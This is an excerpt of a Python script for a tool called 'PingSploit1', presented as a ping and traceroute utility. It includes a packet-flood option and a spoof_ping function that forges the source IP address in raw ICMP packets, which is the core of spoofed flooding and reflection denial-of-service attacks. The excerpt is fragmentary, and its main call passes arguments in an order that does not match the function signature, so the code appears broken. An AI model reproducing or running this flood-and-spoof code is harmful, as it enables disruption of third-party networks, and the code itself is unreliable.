...
# Function to perform the PingSploit1 action
def pingsploit1(dest_name, max_hops=30, timeout=2, interval=1, flood=False, fast=False, spoof=False, source_ip=None, resolve=False):
    dest_ip = socket.gethostbyname(dest_name)
    print(f"PingSploit1 to {dest_name} ({dest_ip}), {max_hops} hops max:")

    if resolve:
        print(f"Resolved {dest_name} to {dest_ip}")
    ...
    for ttl in range(1, max_hops + 1):
        ...
        if flood:
            ...
            # Spoof the source IP
            spoof_thread = threading.Thread(target=spoof_ping, args=(icmp_socket, dest_ip, packet, ttl, source_ip))
            spoof_thread.start()
            spoof_thread.join()
        else:
...
# Spoof Ping Function
def spoof_ping(icmp_socket, dest_ip, packet, ttl, source_ip):
    """Send spoofed ICMP ping packets with the given source IP."""
    print(f"Spoofing source IP {source_ip} to {dest_ip}")
    ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 0, 0, 0, 0, ttl, 0, socket.inet_aton(source_ip), socket.inet_aton(dest_ip))
    icmp_socket.sendto(ip_header + packet, (dest_ip, 0))

# Function to parse command-line arguments
def parse_args():
    """Parse command-line arguments."""
    global max_hops, timeout, interval, flood_mode, ping_count, packet_size, ttl, resolve, dont_fragment
    global record_route, timestamp, source_route, source_address, ipv6, tos, reverse_route, compartment, hyperv, verbose

    parser = argparse.ArgumentParser(description="PingSploit1: Advanced ping and traceroute tool.")
    ...
    parser.add_argument("-c", "--compartment", type=int, help="Routing compartment identifier.")
    parser.add_argument("-p", "--hyperv", action="store_true", help="Ping a Hyper-V Network Virtualization provider address.")
    parser.add_argument("-4", "--ipv4", action="store_true", help="Force using IPv4.")
    parser.add_argument("-6", "--ipv6", action="store_true", help="Force using IPv6.")
    parser.add_argument("--flood", action="store_true", help="Flood the server with packets.")
    parser.add_argument("--spoof", type=str, help="Spoof source address for ping.")
...
if __name__ == "__main__":
    args = parse_args()
    pingsploit1(args.destination, args.count, args.timeout, args.size, args.flood, args.ping_forever, args.spoof, args.source_address, args.resolve)
